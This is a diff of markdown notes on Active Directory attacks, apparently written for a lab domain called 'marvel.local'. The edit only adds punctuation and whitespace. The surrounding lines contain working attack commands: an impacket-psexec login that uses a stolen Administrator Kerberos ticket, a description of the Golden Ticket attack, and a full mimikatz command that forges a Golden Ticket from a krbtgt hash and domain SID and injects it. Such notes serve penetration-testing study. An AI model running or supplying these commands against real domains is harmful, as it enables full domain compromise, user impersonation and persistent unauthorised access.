@@ -49,7 +49,7 @@ export KRB5CCNAME=Administrator.ccache; impacket-psexec -dc-ip 192.168.154.134 -
 
 
 #### Golden ticket attack :
-A Golden Ticket attack is a powerful post-exploitation technique where an attacker forges a Kerberos Ticket Granting Ticket (TGT) using the stolen hash of the KRBTGT account in Active Directory. This forged ticket gives the attacker unrestricted access to any resource in the domain — allowing them to impersonate any user, including domain admins, and maintain persistent control
+A Golden Ticket attack is a powerful post-exploitation technique where an attacker forges a Kerberos Ticket Granting Ticket (TGT) using the stolen hash of the KRBTGT account in Active Directory. This forged ticket gives the attacker unrestricted access to any resource in the domain — allowing them to impersonate any user, including domain admins, and maintain persistent control.
 ```bash
 #requirements
 kbrtgt:hash
@@ -60,5 +60,7 @@ impersonate-user
 
 #mimikatz :
 kerberos::golden /User:zoro /domain:marvel.local /sid:S-1-5-21-3614020701-506922700-4184706594 /krbtgt:c90bf74688c024687385328ca2616f5b /id:500 /ptt
+
+
 
 ```
